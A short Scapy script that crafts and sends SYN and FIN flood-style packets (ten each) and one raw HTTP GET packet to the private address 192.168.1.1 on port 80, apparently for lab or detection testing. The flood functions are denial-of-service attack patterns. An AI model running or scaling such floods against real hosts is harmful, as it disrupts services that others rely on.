from scapy.all import *

# Function to send SYN Flood packets
def send_syn_flood():
    dst_ip = "192.168.1.1"
    dst_port = 80
    for _ in range(10):
        src_port = RandShort()
        ip = IP(dst=dst_ip)
        tcp = TCP(sport=src_port, dport=dst_port, flags="S")
        packet = ip/tcp
        send(packet)
        print(f"SYN packet sent to {dst_ip}:{dst_port}")

# Function to send FIN Flood packets
def send_fin_flood():
    dst_ip = "192.168.1.1"
    dst_port = 80
    for _ in range(10):
        src_port = RandShort()
        ip = IP(dst=dst_ip)
        tcp = TCP(sport=src_port, dport=dst_port, flags="F")
        packet = ip/tcp
        send(packet)
        print(f"FIN packet sent to {dst_ip}:{dst_port}")

# Function to send normal HTTP request
def send_http_request():
    dst_ip = "192.168.1.1"
    dst_port = 80
    ip = IP(dst=dst_ip)
    tcp = TCP(dport=dst_port, flags="PA")
    payload = "GET / HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n"
    packet = ip/tcp/payload
    send(packet)
    print(f"HTTP request sent to {dst_ip}:{dst_port}")

# Sending different types of packets
send_syn_flood()
send_fin_flood()
send_http_request()
